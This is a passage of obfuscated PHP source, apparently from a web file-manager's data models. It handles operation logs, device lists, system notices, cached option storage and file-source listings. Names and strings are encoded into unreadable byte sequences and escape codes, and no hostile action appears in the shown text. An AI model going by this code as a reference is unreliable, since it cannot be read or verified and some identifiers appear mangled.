$§¥àÖ†[$ş…áåãÑ[2079]] = $äçƒ§Š[$ş…áåãÑ[441]]; $¨û·´‘ª[$Ş¨òƒ][$ş…áåãÑ[462]] = json_encode($§¥àÖ†); continue; } $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[411]]; $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[2079]]; if ($§¥àÖ†[$ş…áåãÑ[43]] == $ş…áåãÑ[557]) { $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[462]][$ş…áåãÑ[1157]]; $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[462]][$ş…áåãÑ[1158]]; } if ($§¥àÖ†[$ş…áåãÑ[43]] == $ş…áåãÑ[2089]) { $³ƒéä[] = $§¥àÖ†[$ş…áåãÑ[462]][$ş…áåãÑ[411]]; } } if (!$³ƒéä) { return array(); } return Model($ş…áåãÑ[823])->sourceListInfo($³ƒéä, !0); } private function logList($¡®ˆ›Û—) { $Ø‹Ú­³ =& $_SERVER[Å¶¨Şêº]; $íæûÕö… = array_to_keyvalue($¡®ˆ›Û—, $Ø‹Ú­³[12], $Ø‹Ú­³[1663]); $ƒ¬¸ëúÛ = Model($Ø‹Ú­³[534])->userListInfo(array_unique($íæûÕö…)); $ëÍÀ¿ = $this->getSourceList($¡®ˆ›Û—); $óúÍ²íÖ = $this->typeAll(); $µ¬ñ‡úÕ = array(); $®¾€éõ = array(); foreach ($¡®ˆ›Û— as $í·îÙ±ô => $Ûé‡ºìÈ) { $ÓÚ—èŠû = $Ûé‡ºìÈ[$Ø‹Ú­³[43]]; $í Äñµß = isset($ƒ¬¸ëúÛ[$Ûé‡ºìÈ[$Ø‹Ú­³[1663]]]) ? $ƒ¬¸ëúÛ[$Ûé‡ºìÈ[$Ø‹Ú­³[1663]]] : !1; $¨‹Ø = strpos($ÓÚ—èŠû, $Ø‹Ú­³[2279]) === 0 ? LNG($Ø‹Ú­³[2280]) : LNG($Ø‹Ú­³[2275]); $Ûé‡ºìÈ[$Ø‹Ú­³[42]] = isset($í Äñµß[$Ø‹Ú­³[42]]) ? $í Äñµß[$Ø‹Ú­³[42]] : LNG($Ø‹Ú­³[2275]); $Ûé‡ºìÈ[$Ø‹Ú­³[541]] = isset($í Äñµß[$Ø‹Ú­³[541]]) ? $í Äñµß[$Ø‹Ú­³[541]] : $Ø‹Ú­³[12]; $Ûé‡ºìÈ[$Ø‹Ú­³[1563]] = isset($óúÍ²íÖ[$ÓÚ—èŠû]) ? $óúÍ²íÖ[$ÓÚ—èŠû] : $¨‹Ø; $Ûé‡ºìÈ[$Ø‹Ú­³[2024]] = $í Äñµß; $º¥ô¸¼å = json_decode($Ûé‡ºìÈ[$Ø‹Ú­³[462]], !0); $Ûé‡ºìÈ[$Ø‹Ú­³[2272]] = isset($º¥ô¸¼å[$Ø‹Ú­³[2272]]) ? $º¥ô¸¼å[$Ø‹Ú­³[2272]] : $Ø‹Ú­³[12]; $Ûé‡ºìÈ[$Ø‹Ú­³[2276]] = IpLocation::get($Ûé‡ºìÈ[$Ø‹Ú­³[2272]]); if (strpos($ÓÚ—èŠû, $Ø‹Ú­³[2081]) === 0 || isset($º¥ô¸¼å[$Ø‹Ú­³[2079]])) { $º¥ô¸¼å[$Ø‹Ú­³[98]] = $ëÍÀ¿[$º¥ô¸¼å[$Ø‹Ú­³[411]]]; $º¥ô¸¼å[$Ø‹Ú­³[2094]] = $ëÍÀ¿[$º¥ô¸¼å[$Ø‹Ú­³[2079]]]; if ($º¥ô¸¼å[$Ø‹Ú­³[43]] == $Ø‹Ú­³[557]) { $º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[1157]] = $ëÍÀ¿[$º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[1157]]]; $º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[1158]] = $ëÍÀ¿[$º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[1158]]]; } if ($º¥ô¸¼å[$Ø‹Ú­³[43]] == $Ø‹Ú­³[2089]) { $º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[411]] = $ëÍÀ¿[$º¥ô¸¼å[$Ø‹Ú­³[462]][$Ø‹Ú­³[411]]]; } if ($º¥ô¸¼å[$Ø‹Ú­³[43]] == $Ø‹Ú­³[1821]) { $º¥ô¸¼å[$Ø‹Ú­³[2094]] = $º¥ô¸¼å[$Ø‹Ú­³[98]]; $º¥ô¸¼å[$Ø‹Ú­³[2079]] = $º¥ô¸¼å[$Ø‹Ú­³[2094]][$Ø‹Ú­³[411]]; $º¥ô¸¼å[$Ø‹Ú­³[98]] = !1; $º¥ô¸¼å[$Ø‹Ú­³[411]] = $Ø‹Ú­³[12]; } if ($º¥ô¸¼å[$Ø‹Ú­³[98]] && $º¥ô¸¼å[$Ø‹Ú­³[98]][$Ø‹Ú­³[420]] == $Ø‹Ú­³[1282]) { $®¾€éõ[] = $Ûé‡ºìÈ[$Ø‹Ú­³[408]]; unset($¡®ˆ›Û—[$í·îÙ±ô]); continue; } if ($º¥ô¸¼å[$Ø‹Ú­³[2094]] && $º¥ô¸¼å[$Ø‹Ú­³[2094]][$Ø‹Ú­³[420]] == $Ø‹Ú­³[1282]) { $®¾€éõ[] = $Ûé‡ºìÈ[$Ø‹Ú­³[408]]; unset($¡®ˆ›Û—[$í·îÙ±ô]); continue; } } $Ûé‡ºìÈ[$Ø‹Ú­³[462]] = $º¥ô¸¼å; unset($Ûé‡ºìÈ[$Ø‹Ú­³[2281]]); $µ¬ñ‡úÕ[] = $Ûé‡ºìÈ; } $this->clearSystemPathLog($®¾€éõ); return $µ¬ñ‡úÕ; } private function clearSystemPathLog($“…°õßô) { $µ“›“ó =& $_SERVER[Å¶¨Şêº]; if (count($“…°õßô) == 0) { return; } $‰Šáò·œ = array($µ“›“ó[408] => array($µ“›“ó[7], array_unique($“…°õßô))); $this->where($‰Šáò·œ)->delete(); } public function deviceList($›éÔ×·, $ĞÁ²éâì = 0) { $¢ö·„ö’ =& $_SERVER[Å¶¨Şêº]; $ËÄ¨äéí = array($¢ö·„ö’[1663] => $›éÔ×·, $¢ö·„ö’[212] => array($¢ö·„ö’[1011], $ĞÁ²éâì), $¢ö·„ö’[43] => $¢ö·„ö’[1795]); $‘Ô‰ÙÙ = array(); $Ú¯é–‡À = $this->field($¢ö·„ö’[2282])->where($ËÄ¨äéí)->order($¢ö·„ö’[2092])->limit(50)->select(); foreach ($Ú¯é–‡À as $ô—·Æí¯ => $˜·†ÁŒ¥) { if ($ô—·Æí¯ > 0 && abs($˜·†ÁŒ¥[$¢ö·„ö’[212]] - $Ú¯é–‡À[$ô—·Æí¯ - 1][$¢ö·„ö’[212]]) < 5) { continue; } $­¥•¬‘¿ = json_decode($˜·†ÁŒ¥[$¢ö·„ö’[462]], !0); $˜·†ÁŒ¥[$¢ö·„ö’[2272]] = isset($­¥•¬‘¿[$¢ö·„ö’[2272]]) ? $­¥•¬‘¿[$¢ö·„ö’[2272]] : $¢ö·„ö’[12]; unset($­¥•¬‘¿[$¢ö·„ö’[2272]]); $àÊşùÌ‘ = $this->deviceType($­¥•¬‘¿[$¢ö·„ö’[2082]]); if (isset($‘Ô‰ÙÙ[$àÊşùÌ‘])) { continue; } $˜·†ÁŒ¥[$¢ö·„ö’[2276]] = IpLocation::get($˜·†ÁŒ¥[$¢ö·„ö’[2272]]); $˜·†ÁŒ¥[$¢ö·„ö’[462]] = $­¥•¬‘¿; $‘Ô‰ÙÙ[$àÊşùÌ‘] = $˜·†ÁŒ¥; } return array_values($‘Ô‰ÙÙ); } public function deviceType($ÂúéÒğó) { return $ÂúéÒğó; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\156\157\164\151\143\145\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\143\157\x6e\x74\x65\x6e\x74", "\141\165\164\150", "\x6d\157\144\x65", "\x74\151\155\x65", "\164\x79\160\x65", "\x6c\145\166\145\x6c", "\145\156\x61\x62\154\145", "\x73\x6f\162\x74"); public function listData($šÃÒ·¾Ç = false, $³Çâü©Ó = "\163\x6f\162\x74", $çÃÁ¿¡ = false) { return parent::listData($šÃÒ·¾Ç, $³Çâü©Ó, $çÃÁ¿¡); } public function add($ôºğõª) { $¬¡µù±¾ =& $_SERVER[Å¶¨Şêº]; $„µÎ×šŸ = time(); if ($ôºğõª[$¬¡µù±¾[26]] == $¬¡µù±¾[2283]) { $„µÎ×šŸ = strtotime($ôºğõª[$¬¡µù±¾[191]]); } $ôºğõª[$¬¡µù±¾[191]] = $„µÎ×šŸ; return parent::insert($ôºğõª); } public function update($ùì—Øæ, $ÆÃ·Œ×ï) { $ˆ†Í¤Ã§ =& $_SERVER[Å¶¨Şêº]; $Ò—”Âõ = $this->listData($ùì—Øæ); if (!$Ò—”Âõ) { return !1; } $½¸Øóí = time(); if ($ÆÃ·Œ×ï[$ˆ†Í¤Ã§[26]] == $ˆ†Í¤Ã§[2283]) { $½¸Øóí = strtotime($ÆÃ·Œ×ï[$ˆ†Í¤Ã§[191]]); } $ÆÃ·Œ×ï[$ˆ†Í¤Ã§[191]] = $½¸Øóí; return parent::update($ùì—Øæ, $ÆÃ·Œ×ï); } public function remove($ÙÏ”ÀÈ²) { $ÜÙæÒÃ = $this->listData($ÙÏ”ÀÈ²); if (!$ÜÙæÒÃ || $ÜÙæÒÃ[$_SERVER[Å¶¨Şêº][1282]]) { return !1; } return parent::remove($ÙÏ”ÀÈ²); } public function sort($ìıÓ‰, $é¢™Üš) { return parent::update($ìıÓ‰, $é¢™Üš); } public function enable($¨··®¯¶, $°Øş Ç) { return parent::update($¨··®¯¶, array($_SERVER[Å¶¨Şêº][2284] => $°Øş Ç)); } private function initUserOption() { $ áĞÚ¦Á =& $_SERVER[Å¶¨Şêº]; $this->optionType = $ áĞÚ¦Á[2285]; $this->modelType = $ áĞÚ¦Á[2286]; $this->field = array($ áĞÚ¦Á[2287], $ áĞÚ¦Á[42], $ áĞÚ¦Á[191], $ áĞÚ¦Á[43], $ áĞÚ¦Á[2288], $ áĞÚ¦Á[747], $ áĞÚ¦Á[207]); } public function userNoticeGet($Îšä¥õ = false) { $this->initUserOption(); return parent::listData($Îšä¥õ, $_SERVER[Å¶¨Şêº][408], !0); } public function userNoticeAdd($Õíİë˜) { $Ë§´‰ı =& $_SERVER[Å¶¨Şêº]; $this->initUserOption(); $‘ƒ†Œ·ğ = $this->findByKey($Ë§´‰ı[2287], $Õíİë˜[$Ë§´‰ı[408]]); if ($‘ƒ†Œ·ğ) { return !0; } $î˜­¯‡ò = array($Ë§´‰ı[2287] => $Õíİë˜[$Ë§´‰ı[408]], $Ë§´‰ı[42] => $Õíİë˜[$Ë§´‰ı[42]], $Ë§´‰ı[191] => $Õíİë˜[$Ë§´‰ı[191]], $Ë§´‰ı[43] => isset($Õíİë˜[$Ë§´‰ı[43]]) ? $Õíİë˜[$Ë§´‰ı[43]] : 1, $Ë§´‰ı[2288] => isset($Õíİë˜[$Ë§´‰ı[2288]]) ? $Õíİë˜[$Ë§´‰ı[2288]] : 0, $Ë§´‰ı[747] => 0, $Ë§´‰ı[207] => 0); return parent::insert($î˜­¯‡ò); } public function userNoticeEdit($‡Íò˜şµ, $ß£Òâ) { $this->initUserOption(); return parent::update($‡Íò˜şµ, $ß£Òâ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\x72\x6f\154\x65", "\162\157\x6c\145\x47\162\x6f\165\160", "\162\145\x67\151\163\164", "\145\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ƒáùŸ¿¨) { return "\123\x79\163\x74\145\155\x4f\160\x74\151\x6f\156\137{$ƒáùŸ¿¨}"; } protected function optionDefault($¸’òÖÎ¼ = '') { $îÍªÔŒ’ =& $_SERVER[Å¶¨Şêº]; if ($¸’òÖÎ¼ == $îÍªÔŒ’[12]) { return $GLOBALS[$îÍªÔŒ’[6]][$îÍªÔŒ’[390]]; } } } goto CÕƒù½ÓŒè; BåáªŞß’¦: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\x6d\x4f\160\164\x69\157\156"; public $field = array(); public function listData($—Ô¶Â”È = false, $ôò±×Ñ = "\155\x6f\x64\151\146\171\124\151\155\x65", $ÌÓÂË• = false) { $ßĞÃÈü = Model($this->modelType)->get(!1, $this->optionType, !0); $®çóé”µ = array_values($ßĞÃÈü); if ($®çóé”µ && $®çóé”µ[0] && !is_array($®çóé”µ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ßĞÃÈü = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ßĞÃÈü) { return $—Ô¶Â”È ? null : array(); } if (!$—Ô¶Â”È) { $ßĞÃÈü = array_filter(array_values($ßĞÃÈü)); return array_sort_by($ßĞÃÈü, $ôò±×Ñ, $ÌÓÂË•); } return $ßĞÃÈü[$_SERVER[Å¶¨Şêº][405] . $—Ô¶Â”È]; } public function insert($äúËà”Œ) { $ïÎœö¨“ =& $_SERVER[Å¶¨Şêº]; $äúËà”Œ = array_field_key($äúËà”Œ, $this->field); $¿ıËì¢º = Model($this->modelType)->get($ïÎœö¨“[406], $this->optionType . $ïÎœö¨“[407]); $¿ıËì¢º = $¿ıËì¢º ? $¿ıËì¢º : 0; $äúËà”Œ[$ïÎœö¨“[408]] = ++$¿ıËì¢º; $äúËà”Œ[$ïÎœö¨“[212]] = time(); $äúËà”Œ[$ïÎœö¨“[96]] = time(); Model($this->modelType)->set($ïÎœö¨“[406], $¿ıËì¢º, $this->optionType . $ïÎœö¨“[407]); Model($this->modelType)->set($ïÎœö¨“[405] . $¿ıËì¢º, $äúËà”Œ, $this->optionType); return $¿ıËì¢º; } public function update($Ë±¦øéŠ, $÷ÊöŸ¹) { $÷Ùâ §¤ =& $_SERVER[Å¶¨Şêº]; $÷ÊöŸ¹ = array_field_key($÷ÊöŸ¹, $this->field); $ı•¾êòÚ = $this->listData($Ë±¦øéŠ); if (!$ı•¾êòÚ || !$Ë±¦øéŠ) { return !1; } $÷ÊöŸ¹ = array_merge($ı•¾êòÚ, $÷ÊöŸ¹); $÷ÊöŸ¹[$÷Ùâ §¤[96]] = time(); return Model($this->modelType)->set($÷Ùâ §¤[405] . $Ë±¦øéŠ, $÷ÊöŸ¹, $this->optionType); } public function remove($òÛúÆ…) { if (!$òÛúÆ…) { return !1; } return Model($this->modelType)->remove($_SERVER[Å¶¨Şêº][405] . $òÛúÆ…, $this->optionType); } public function clear() { $¦Ãû×‡ =& $_SERVER[Å¶¨Şêº]; Model($this->modelType)->remove($¦Ãû×‡[406], $this->optionType . $¦Ãû×‡[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ĞÍ‡º–°, $½ÄÚøö) { if (!$½ÄÚøö) { return !1; } $¸³Íß¥ = $this->listData(); $¸³Íß¥ = array_to_keyvalue($¸³Íß¥, $ĞÍ‡º–°); return isset($¸³Íß¥[$½ÄÚøö]) ? $¸³Íß¥[$½ÄÚøö] : !1; } public function findByName($æ¿”Ôü§) { return $this->findByKey($_SERVER[Å¶¨Şêº][42], $æ¿”Ôü§); } protected function resetData($½Ì†Ç­) { $ì¶²¯§§ =& $_SERVER[Å¶¨Şêº]; $½Ì†Ç­ = is_array($½Ì†Ç­) ? $½Ì†Ç­ : array(); $½»¥—» = array(); for ($‡‡†’´È = 0; $‡‡†’´È < count($½Ì†Ç­); $‡‡†’´È++) { $½»¥—»[$ì¶²¯§§[405] . $½Ì†Ç­[$‡‡†’´È][$ì¶²¯§§[408]]] = $½Ì†Ç­[$‡‡†’´È]; } return Model($this->modelType)->set($½»¥—», !1, $this->optionType); } private function getAutoName($³Á’²Ü) { $—Ëûü¨Á = array_to_keyvalue($this->listData(), $_SERVER[Å¶¨Şêº][42]); if (!$—Ëûü¨Á || !isset($—Ëûü¨Á[$³Á’²Ü])) { return $³Á’²Ü; } for ($ªĞ¦Äõ = 1; $ªĞ¦Äõ < count($—Ëûü¨Á); $ªĞ¦Äõ++) { $ßÙø­íÖ = $³Á’²Ü . "\50{$ªĞ¦Äõ}\x29"; if (!isset($—Ëûü¨Á[$ßÙø­íÖ])) { return $ßÙø­íÖ; } } return $ßÙø­íÖ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Â—Ìºã™ = false, $ š§Ç‡í = '', $¼ğ¼àÅ§ = false) { $×Ü§ù´· =& $_SERVER[Å¶¨Şêº]; $óµ«­ = $this->cacheGet($ š§Ç‡í); $¦å¸‚öÕ = $this->optionDefault($ š§Ç‡í); $¦å¸‚öÕ = is_array($¦å¸‚öÕ) ? $¦å¸‚öÕ : array(); if (is_array($óµ«­)) { $óµ«­ = array_merge($¦å¸‚öÕ, $óµ«­); return $Â—Ìºã™ ? isset($óµ«­[$Â—Ìºã™]) ? $óµ«­[$Â—Ìºã™] : null : $óµ«­; } $ô€Ã¶Íç = $this->filterWhere(array($×Ü§ù´·[43] => $ š§Ç‡í)); $óµ«­ = $this->where($ô€Ã¶Íç)->select(); $óµ«­ = array_to_keyvalue($óµ«­, $×Ü§ù´·[105], $×Ü§ù´·[384]); foreach ($óµ«­ as $Ó«Ê²¨ç => $·ä“ ù ) { if ($¼ğ¼àÅ§ || in_array($Ó«Ê²¨ç, $this->jsonField)) { $óµ«­[$Ó«Ê²¨ç] = json_decode($·ä“ ù , !0); } } $this->cacheSet($ š§Ç‡í, $óµ«­); $óµ«­ = array_merge($¦å¸‚öÕ, $óµ«­); return $Â—Ìºã™ ? $óµ«­[$Â—Ìºã™] : $óµ«­; } public function set($ ¬â€å, $Óí¾ŸÄƒ = false, $Ş­ÚÃÅ– = '') { $¨îëÃ·ó =& $_SERVER[Å¶¨Şêº]; $this->cacheRemove($Ş­ÚÃÅ–); $“¬´Å¨õ = array(); $¥²¢û· = is_array($ ¬â€å) ? $ ¬â€å : array($ ¬â€å => $Óí¾ŸÄƒ); foreach ($¥²¢û· as $İı”§‡œ => $®£ˆ÷º–) { if (is_array($®£ˆ÷º–)) { $®£ˆ÷º– = json_encode_force($®£ˆ÷º–); } $this->checkLength($®£ˆ÷º–, !1, $this->tableName . $¨îëÃ·ó[4] . $ ¬â€å); $®£ˆ÷º– = self::textEncode($®£ˆ÷º–); $¥²¢û· = array($¨îëÃ·ó[43] => $Ş­ÚÃÅ–, $¨îëÃ·ó[105] => $İı”§‡œ, $¨îëÃ·ó[384] => $®£ˆ÷º–); $“¬´Å¨õ[] = $this->filterWhere($¥²¢û·); } if (!$“¬´Å¨õ) { return !0; } $ŞÄ·Ûáœ = $this->cacheKey($¨îëÃ·ó[409]); CacheLock::lock($ŞÄ·Ûáœ); $–ŠÃÕ´ù = $this->addAll($“¬´Å¨õ, array(), !0); CacheLock::unlock($ŞÄ·Ûáœ); return $–ŠÃÕ´ù; } protected function optionDefault($ªƒ¹õê‹ = '') { return !1; } public function setDeep($²ûÑ¹·ö, $ë”ßã´º = false, $’ªÂ­ª = '') { $½”òçÍÀ = explode($_SERVER[Å¶¨Şêº][10], $²ûÑ¹·ö); $ìç‘ËÛ = $this->get(); array_set_value($ìç‘ËÛ, $²ûÑ¹·ö, $ë”ßã´º); $this->set($½”òçÍÀ[0], $ìç‘ËÛ[$½”òçÍÀ[0]], $’ªÂ­ª); } public function remove($×¹›ÙÆ, $éµŠÆˆÕ = '') { $ˆ—Õö¹ª =& $_SERVER[Å¶¨Şêº]; $this->cacheRemove($éµŠÆˆÕ); $ù±Ä‘Äı = $this->filterWhere(array($ˆ—Õö¹ª[105] => $×¹›ÙÆ, $ˆ—Õö¹ª[43] => $éµŠÆˆÕ)); if (is_null($×¹›ÙÆ)) { unset($ù±Ä‘Äı[$ˆ—Õö¹ª[105]]); } return $this->where($ù±Ä‘Äı)->delete(); } public function cacheSet($Æ§Àöı­, $‹ƒğË = false) { return Cache::set($this->cacheKey($Æ§Àöı­), $‹ƒğË); } public function cacheGet($ş“çÀ“) { return Cache::get($this->cacheKey($ş“çÀ“)); } public function cacheRemove($ª×¦®şÍ) { return Cache::remove($this->cacheKey($ª×¦®şÍ)); } protected function filterWhere($¬Õª§²Â) { return $¬Õª§²Â; } protected function cacheKey($¼—ÊµË) { return $¼—ÊµË; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\x63\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\x65" => "\x69\x6f\137\163\157\x75\x72\x63\x65\x5f\155\145\164\141", "\x6d\x65\164\141\x46\x69\145\x6c\144" => "\x73\x6f\165\x72\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\151\x6d\145", "\x74\151\155\145", "\151\156\x73\x65\162\164", "\x66\x75\156\143\x74\151\157\156"), array("\143\x72\145\x61\x74\x65\x54\151\155\145", "\164\151\155\x65", "\151\x6e\163\x65\162\x74", "\146\165\x6e\143\164\151\157\156"), array("\166\151\145\167\124\151\x6d\x65", "\164\151\155\x65", "\x69\156\x73\x65\x72\x74", "\x66\x75\156\x63\164\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Æ‚á†•™) { return $this->listSource(array($_SERVER[Å¶¨Şêº][410] => $Æ‚á†•™)); } public function typeName($«ó¦Ö‡) { static $êŒ†·ë = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $êŒ†·ë[$«ó¦Ö‡ . $_SERVER[Å¶¨Şêº][12]]; } public function sourceListInfo($ŠËêŞÄ’, $áå•ÈõÎ = false) { $Õ¶Ğ‹½î =& $_SERVER[Å¶¨Şêº]; $ŠËêŞÄ’ = $ŠËêŞÄ’ ? $ŠËêŞÄ’ : array(); $ŠËêŞÄ’ = array_filter(array_unique($ŠËêŞÄ’)); if (!$ŠËêŞÄ’) { return array(); } $ú‡–¼ó° = $this->where(array($Õ¶Ğ‹½î[411] => array($Õ¶Ğ‹½î[7], $ŠËêŞÄ’)))->select(); $this->_listDataApply($ú‡–¼ó°, $áå•ÈõÎ); return array_to_keyvalue($ú‡–¼ó°, $Õ¶Ğ‹½î[411]); } public function pathInfoFilter(&$¼‡†Îª¸) { $Õ—×ÎûÊ =& $_SERVER[Å¶¨Şêº]; static $òæÆ— = false; static $Ù“ãÂâ² = false; static $÷“ØˆÖ¾ = false; if (!$òæÆ—) { $’öİå‰½ = $Õ—×ÎûÊ[412]; $’öİå‰½ .= $Õ—×ÎûÊ[413]; $’öİå‰½ .= $Õ—×ÎûÊ[414]; $åï–Ïº = $Õ—×ÎûÊ[415]; $Ó‰ÏÕ·· = explode($Õ—×ÎûÊ[60], $åï–Ïº); $òæÆ— = explode($Õ—×ÎûÊ[60], $’öİå‰½); $Ù“ãÂâ² = array(); foreach ($òæÆ— as $ÖñúüúÂ) { if (in_array($ÖñúüúÂ, $Ó‰ÏÕ··)) { continue; } $Ù“ãÂâ²[] = $ÖñúüúÂ; } $÷“ØˆÖ¾ = explode($Õ—×ÎûÊ[60], $Õ—×ÎûÊ[416]); } foreach ($÷“ØˆÖ¾ as $‡Áê‰’) { if (isset($¼‡†Îª¸[$‡Áê‰’])) { $¼‡†Îª¸[$‡Áê‰’] = intval($¼‡†Îª¸[$‡Áê‰’]); } } $¼‡†Îª¸[$Õ—×ÎûÊ[95]] = $Õ—×ÎûÊ[417] . $¼‡†Îª¸[$Õ—×ÎûÊ[411]] . $Õ—×ÎûÊ[418]; $¼‡†Îª¸[$Õ—×ÎûÊ[43]] = $¼‡†Îª¸[$Õ—×ÎûÊ[419]] == 1 ? $Õ—×ÎûÊ[86] : $Õ—×ÎûÊ[211]; $¼‡†Îª¸[$Õ—×ÎûÊ[420]] = $this->typeName($¼‡†Îª¸[$Õ—×ÎûÊ[420]]); if ($¼‡†Îª¸[$Õ—×ÎûÊ[419]] != 1) { $¼‡†Îª¸[$Õ—×ÎûÊ[185]] = $¼‡†Îª¸[$Õ—×ÎûÊ[421]]; unset($¼‡†Îª¸[$Õ—×ÎûÊ[421]]); } $§Ò˜«å© = $òæÆ—; if (isset($¼‡†Îª¸[$Õ—×ÎûÊ[422]]) && $¼‡†Îª¸[$Õ—×ÎûÊ[422]][$Õ—×ÎûÊ[423]] == -1) { $§Ò˜«å© = $Ù“ãÂâ²; } $¼‡†Îª¸ = array_field_key($¼‡†Îª¸, $§Ò˜«å©); return $¼‡†Îª¸; } public function listUserFav() { $¥õºµô =& $_SERVER[Å¶¨Şêº]; $ª‘ÚŞÆ” = Model($¥õºµô[424])->listData(); $Ó¼©³ù‡ = array_filter_by_field($ª‘ÚŞÆ”, $¥õºµô[43], $¥õºµô[425]); $Ó¼©³ù‡ = array_to_keyvalue($Ó¼©³ù‡, $¥õºµô[12], $¥õºµô[95]); if ($Ó¼©³ù‡) { $ó”£µñ  = $this->listSource(array($¥õºµô[426] => array($¥õºµô[427], $Ó¼©³ù‡))); } $ó”£µñ  = array_to_keyvalue($ó”£µñ [$¥õºµô[379]], $¥õºµô[411]); foreach ($ª‘ÚŞÆ” as &$˜ĞµúÑ³) { $˜ĞµúÑ³ = array($¥õºµô[428] => $˜ĞµúÑ³[$¥õºµô[408]], $¥õºµô[429] => $˜ĞµúÑ³[$¥õºµô[42]], $¥õºµô[430] => $˜ĞµúÑ³[$¥õºµô[95]], $¥õºµô[431] => $˜ĞµúÑ³[$¥õºµô[43]], $¥õºµô[432] => $˜ĞµúÑ³[$¥õºµô[212]], $¥õºµô[433] => $˜ĞµúÑ³[$¥õºµô[96]]); if ($˜ĞµúÑ³[$¥õºµô[43]] == $¥õºµô[425] && $ó”£µñ [$˜ĞµúÑ³[$¥õºµô[95]]]) { $˜ĞµúÑ³[$¥õºµô[98]] = $ó”£µñ [$˜ĞµúÑ³[$¥õºµô[95]]]; } } unset($˜ĞµúÑ³); return $ª‘ÚŞÆ”; } public function listUserTag($£îáíç) { $àœçîë¡ =& $_SERVER[Å¶¨Şêº]; if ($£îáíç && !is_array($£îáíç)) { $£îáíç = array($£îáíç); } $ŸÎ»‰Â˜ = Model($àœçîë¡[434])->listData(); $Ğ¾’Ú¸ò = array(); $³³ø–çî = array(); foreach ($ŸÎ»‰Â˜ as $œ¡ş´½Æ) { $Ğ’İ¨‘ı = $œ¡ş´½Æ[$àœçîë¡[95]]; if (!$Ğ’İ¨‘ı) { continue; } if (!isset($³³ø–çî[$Ğ’İ¨‘ı])) { $³³ø–çî[$Ğ’İ¨‘ı] = array(); } $³³ø–çî[$Ğ’İ¨‘ı][] = $œ¡ş´½Æ[$àœçîë¡[435]]; $Ğ¾’Ú¸ò[$œ¡ş´½Æ[$àœçîë¡[95]]] = $œ¡ş´½Æ; } $öÏĞåÖå = array(); $ğ¨ÛíëÉ = array(); $¿ªäÜğ = array(); foreach ($³³ø–çî as $¹¨’ËŒÀ => $¦¨Ûı‘) { $—Ÿà¯Ö« = !0; if (!$£îáíç) { $öÏĞåÖå[] = $¹¨’ËŒÀ; continue; } foreach ($£îáíç as $€µ¿«ğ›) { if (!in_array($€µ¿«ğ›, $¦¨Ûı‘)) { $—Ÿà¯Ö« = !1; break; } } if (!$—Ÿà¯Ö«) { continue; } if (!is_numeric($¹¨’ËŒÀ)) { $¿ ï‚õ™ = $Ğ¾’Ú¸ò[$¹¨’ËŒÀ]; $“¹µœ — = array($àœçîë¡[42] => $¿ ï‚õ™[$àœçîë¡[42]], $àœçîë¡[95] => $¿ ï‚õ™[$àœçîë¡[95]], $àœçîë¡[43] => $¿ ï‚õ™[$àœçîë¡[43]], $àœçîë¡[98] => array($àœçîë¡[436] => 1), $àœçîë¡[213] => !0); if ($¿ ï‚õ™[$àœçîë¡[43]] == $àœçîë¡[211]) { $¿ªäÜğ[] = $“¹µœ —; } if ($¿ ï‚õ™[$àœçîë¡[43]] == $àœçîë¡[86]) { $ğ¨ÛíëÉ[] = $“¹µœ —; } continue; } $öÏĞåÖå[] = $¹¨’ËŒÀ; } if ($öÏĞåÖå) { $¨Öó¤¶ = $this->listSource(array($àœçîë¡[426] => array($àœçîë¡[427], $öÏĞåÖå))); } $¨Öó¤¶ = $¨Öó¤¶ ? $¨Öó¤¶ : array($àœçîë¡[93] => array(), $àœçîë¡[94] => array()); $¨Öó¤¶[$àœçîë¡[93]] = array_merge($¨Öó¤¶[$àœçîë¡[93]], $ğ¨ÛíëÉ); $¨Öó¤¶[$àœçîë¡[94]] = array_merge($¨Öó¤¶[$àœçîë¡[94]], $¿ªäÜğ); if (isset($¨Öó¤¶[$àœçîë¡[376]]) && count($öÏĞåÖå) == $¨Öó¤¶[$àœçîë¡[376]][$àœçîë¡[377]]) { return $¨Öó¤¶; } $ŒÑéÌ¨ = array(); $îØ…ô» = array_to_keyvalue($¨Öó¤¶[$àœçîë¡[93]], $àœçîë¡[12], $àœçîë¡[411]); $êŞôÅÒç = array_to_keyvalue($¨Öó¤¶[$àœçîë¡[94]], $àœçîë¡[12], $àœçîë¡[411]); $º³†è¼– = array_merge($êŞôÅÒç, $îØ…ô»); foreach ($öÏĞåÖå as $Ğ’İ¨‘ı) { if (!in_array($Ğ’İ¨‘ı, $º³†è¼–)) { $ŒÑéÌ¨[] = $Ğ’İ¨‘ı; } } if ($ŒÑéÌ¨) { 